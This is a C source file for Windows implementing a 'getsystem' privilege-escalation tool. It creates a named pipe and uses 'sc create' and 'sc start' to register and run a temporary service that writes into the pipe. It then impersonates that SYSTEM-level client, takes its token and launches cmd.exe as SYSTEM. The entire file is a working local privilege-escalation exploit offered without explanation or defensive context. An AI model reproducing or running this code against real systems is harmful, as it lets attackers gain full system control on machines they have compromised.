#include <Windows.h>
#include <stdio.h>

static const char *g_szNamedPipe = "\\\\.\\pipe\\getsystemyall";

static const char *g_szServiceCreate = "sc create getsystemyall binPath= \"cmd.exe /c echo WUT > \\\\.\\pipe\\getsystemyall";
static const char *g_szServiceStart = "sc start getsystemyall";
static const char *g_szServiceDelete = "sc delete getsystemyall";

DWORD WINAPI getsystem_thread(PVOID lpUnused)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	char szRead[128] = { 0 };
	DWORD dwBytes = 0;
	HANDLE hToken;
	HANDLE hPipe;
	WCHAR cmd[MAX_PATH] = L"cmd.exe";

	do
	{
		// create the named pipe
		hPipe = CreateNamedPipeA(g_szNamedPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, NULL);

		if (!hPipe)
			break;

		// wait for SC to make connection to the pipe
		while (!ConnectNamedPipe(hPipe, NULL))
		{
			if (GetLastError() == ERROR_PIPE_CONNECTED)
				break;
		}

		// must read at least 1 byte from the pipe
		if (!ReadFile(hPipe, szRead, 1, &dwBytes, NULL))
			break;

		// impersonate the client
		if (!ImpersonateNamedPipeClient(hPipe))
			break;

		// get a handle to the SYSTEM token
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
			break;

		// pop a shell with the system token
		CreateProcessWithTokenW(hToken, 0, NULL, cmd, CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi);
	} while (0);

	// cleanup
	if (hPipe) 
	{
		DisconnectNamedPipe(hPipe);
		CloseHandle(hPipe);
	}
	
	return 0;
}

int main()
{
	DWORD dwThreadId;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)getsystem_thread, NULL, 0, &dwThreadId);

	system(g_szServiceCreate);
	system(g_szServiceStart);
	system(g_szServiceDelete);


	return 0;
}